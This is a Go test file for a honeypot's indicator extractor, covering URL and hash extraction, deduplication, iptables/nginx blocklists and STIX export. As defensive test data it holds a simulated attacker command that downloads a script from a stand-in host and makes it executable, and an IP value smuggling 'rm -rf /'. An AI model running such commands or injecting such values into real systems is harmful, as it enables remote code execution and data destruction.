/*
©AngelaMos | 2026
Modified by Hiten, 2026: rewritten for the observable extractor,
internal-address handling, escaping and export filtering.

ioc_test.go
*/

package intel

import (
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/CarterPerez-dev/hive/pkg/types"
)

func ev(src string, et types.EventType, data map[string]any) *types.Event {
	raw, _ := json.Marshal(data)
	return &types.Event{
		ID: "e1", SessionID: "s1", SourceIP: src, EventType: et,
		ServiceType: types.ServiceSSH, Timestamp: time.Now().UTC(),
		ServiceData: raw,
	}
}

func find(iocs []*types.IOC, t types.IOCType) *types.IOC {
	for _, i := range iocs {
		if i.Type == t {
			return i
		}
	}
	return nil
}

func TestSourceIPPublicAndInternal(t *testing.T) {
	pub := find(NewExtractor().Extract(ev("198.51.100.7", types.EventConnect, nil)), types.IOCIPv4)
	require.NotNil(t, pub)
	assert.False(t, pub.Internal)
	assert.Equal(t, types.ObservableObserved, pub.Status)

	for _, ip := range []string{"127.0.0.1", "10.0.0.5", "192.168.1.9", "::1"} {
		iocs := NewExtractor().Extract(ev(ip, types.EventConnect, nil))
		require.Len(t, iocs, 1, ip)
		assert.True(t, iocs[0].Internal, ip)
	}
}

func TestURLFromShellCommand(t *testing.T) {
	iocs := NewExtractor().Extract(ev("127.0.0.1", types.EventCommand,
		map[string]any{"command": "wget HTTP://Payload.Example.TEST:80/x.sh; chmod +x x.sh"}))
	u := find(iocs, types.IOCURL)
	require.NotNil(t, u)
	assert.Equal(t, "http://payload.example.test/x.sh", u.Value)
	assert.Equal(t, "HTTP://Payload.Example.TEST:80/x.sh", u.Original)
	d := find(iocs, types.IOCDomain)
	require.NotNil(t, d)
	assert.Equal(t, "payload.example.test", d.Value)
}

func TestUserAgentIsClaimed(t *testing.T) {
	iocs := NewExtractor().Extract(ev("198.51.100.7", types.EventRequest,
		map[string]any{"user_agent": "sqlmap/1.7"}))
	ua := find(iocs, types.IOCUserAgent)
	require.NotNil(t, ua)
	assert.True(t, ua.Claimed)
	assert.True(t, HasTag(ua, "claimed-fingerprint"))
}

func TestUploadHashes(t *testing.T) {
	iocs := NewExtractor().Extract(ev("127.0.0.1", types.EventFileUpload, map[string]any{
		"sha256": strings.Repeat("A", 64), "md5": strings.Repeat("b", 32),
	}))
	require.NotNil(t, find(iocs, types.IOCHashSHA256))
	assert.Equal(t, strings.Repeat("a", 64), find(iocs, types.IOCHashSHA256).Value)
	require.NotNil(t, find(iocs, types.IOCHashMD5))
}

func TestExtractBulkDeduplication(t *testing.T) {
	a := ev("198.51.100.7", types.EventConnect, nil)
	b := ev("198.51.100.7", types.EventConnect, nil)
	b.Timestamp = a.Timestamp.Add(time.Minute)
	iocs := ExtractBulk([]*types.Event{a, b})
	require.Len(t, iocs, 1)
	assert.Equal(t, 2, iocs[0].SightCount)
}

func TestBlocklistSkipsInternalAndBadValues(t *testing.T) {
	now := time.Now().UTC()
	iocs := []*types.IOC{
		{Type: types.IOCIPv4, Value: "198.51.100.7", FirstSeen: now, LastSeen: now, Status: "confirmed"},
		{Type: types.IOCIPv4, Value: "127.0.0.1", Internal: true, FirstSeen: now, LastSeen: now},
		{Type: types.IOCIPv4, Value: "1.2.3.4; rm -rf /", FirstSeen: now, LastSeen: now},
		{Type: types.IOCURL, Value: "http://x.test/", FirstSeen: now, LastSeen: now},
	}
	res := GenerateBlocklist(iocs, FormatIPTables, false)
	assert.Equal(t, 1, res.Written)
	assert.Contains(t, res.Text, "iptables -A INPUT -s 198.51.100.7 -j DROP")
	assert.NotContains(t, res.Text, "rm -rf")
	assert.NotContains(t, res.Text, "127.0.0.1")
	assert.Equal(t, 1, res.Skipped["internal address"])
	assert.Equal(t, 1, res.Skipped["unparseable value"])

	res = GenerateBlocklist(iocs, FormatNginx, true)
	assert.Contains(t, res.Text, "deny 127.0.0.1;")
	res = GenerateBlocklist(iocs, FormatCSV, false)
	assert.Contains(t, res.Text, "ip,type,status")
}

func TestSTIXEscapesAndStatus(t *testing.T) {
	now := time.Now().UTC()
	iocs := []*types.IOC{{
		Type: types.IOCURL, Value: `http://x.test/a'b`, FirstSeen: now, LastSeen: now,
		SightCount: 2, Status: types.ObservableSuspicious,
		Evidence: []types.ObservableEvidence{{EventRef: types.EventRef{ID: "ev-1"}}},
	}}
	data, err := GenerateSTIXBundle(iocs)
	require.NoError(t, err)
	var bundle map[string]any
	require.NoError(t, json.Unmarshal(data, &bundle))
	objs := bundle["objects"].([]any)
	require.Len(t, objs, 2)
	ind := objs[1].(map[string]any)
	assert.Equal(t, `[url:value = 'http://x.test/a\'b']`, ind["pattern"])
	assert.Equal(t, []any{"anomalous-activity"}, ind["indicator_types"])
	assert.Equal(t, []any{"ev-1"}, ind["x_hlab_evidence_event_ids"])
	assert.Nil(t, ind["confidence"])
}
